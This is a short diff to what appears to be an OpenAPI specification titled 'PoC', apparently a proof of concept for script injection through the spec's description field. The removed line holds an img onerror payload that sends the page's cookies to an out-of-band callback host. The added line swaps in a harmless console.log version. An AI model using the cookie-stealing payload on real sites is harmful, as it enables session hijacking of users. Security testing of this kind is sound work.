@@ -3,8 +3,9 @@
   "info":{
     "title":"PoC",
     "version":"1.0.0",
-    "description":"<img src=x onerror=\"new Image().src='https://sagmirngzimxhikutodb82e39oz203dic.oast.fun/?c='+encodeURIComponent(document.cookie)\">"
+    "description":"<img src="https://nonexistent.invalid/x.png" onerror="console.log('poc: img onerror')">"
   },
   "paths":{}
 }
+
 
